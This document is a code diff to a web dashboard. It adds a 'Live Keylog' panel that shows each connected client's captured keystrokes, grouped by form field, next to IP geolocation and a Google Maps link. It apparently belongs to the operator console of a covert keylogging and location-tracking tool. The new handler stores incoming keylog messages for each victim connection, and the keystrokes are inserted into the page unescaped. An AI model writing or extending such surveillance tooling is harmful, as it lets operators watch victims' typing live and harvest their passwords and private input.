@@ -1162,6 +1162,12 @@
           </div>
         </div>
 
+        <div class="detail-section">
+          <h4>⌨ Live Keylog</h4>
+          <div id="modalKeylog" style="font-family:monospace;font-size:0.85em;background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:10px;max-height:180px;overflow-y:auto;word-break:break-all;color:var(--green);">
+            <span style="opacity:0.4">No keystrokes yet...</span>
+          </div>
+        </div>
         <div class="modal-footer">
           <a href="#" id="modalMapsLink" target="_blank" class="btn-modal primary">VIEW ON GOOGLE MAPS</a>
           <button class="btn-modal" onclick="closeModal()">CLOSE PANEL</button>
@@ -1367,6 +1373,36 @@
       el.innerHTML = lines.length ? lines.join('<br>') : '<span style="opacity:0.4">Waiting for data...</span>';
     }
 
+    function renderKeylog(id) {
+      const kd = document.getElementById('modalKeylog');
+      if (!kd) return;
+      const keys = (connections[id] && connections[id].keylog) || [];
+      if (!keys.length) { kd.innerHTML = '<span style="opacity:0.4">No keystrokes yet...</span>'; return; }
+
+      let html = '';
+      let currentField = null;
+
+      keys.forEach(k => {
+        if (k.field !== currentField) {
+          if (currentField !== null) html += '</div>';
+          currentField = k.field;
+          html += `<div style="margin-bottom:6px"><span style="color:var(--csa-gold);opacity:0.8;font-size:0.9em;">[${currentField}]</span> `;
+        }
+        
+        let char = k.key;
+        if (char === '[BS]') char = '<span style="color:var(--csa-red);font-weight:bold;font-size:0.8em;">\u232b</span>';
+        else if (char === '[ENTER]') char = '<span style="color:var(--csa-blue);font-weight:bold;font-size:0.8em;">\u21b5</span>';
+        else if (char === '[SPACE]') char = '<span style="opacity:0.3">\u2423</span>';
+        else if (char === '[TAB]') char = '<span style="opacity:0.3">\u21b9</span>';
+        
+        html += char;
+      });
+
+      if (currentField !== null) html += '</div>';
+      kd.innerHTML = html;
+      kd.scrollTop = kd.scrollHeight;
+    }
+
     function openModal(id) {
       const c = connections[id] || {};
       const overlay = document.getElementById('modalOverlay');
@@ -1435,6 +1471,7 @@
         mapsLink.style.display = 'none';
       }
 
+      renderKeylog(id);
       overlay.classList.add('show');
     }
 
@@ -1563,6 +1600,17 @@
             updateCardInfo(id);
           }
 
+          if (msg.type === 'keylog') {
+            if (!connections[id]) connections[id] = {};
+            if (!connections[id].keylog) connections[id].keylog = [];
+            connections[id].keylog.push(...msg.keys);
+            // Update modal if open
+            const kd = document.getElementById('modalKeylog');
+            const mid = document.getElementById('clientModal');
+            if (kd && mid && mid.dataset.clientId === id) {
+              renderKeylog(id);
+            }
+          }
           if (msg.type === 'ip_geo') {
             if (!connections[id]) connections[id] = {};
             if (!connections[id].location) connections[id].location = {};
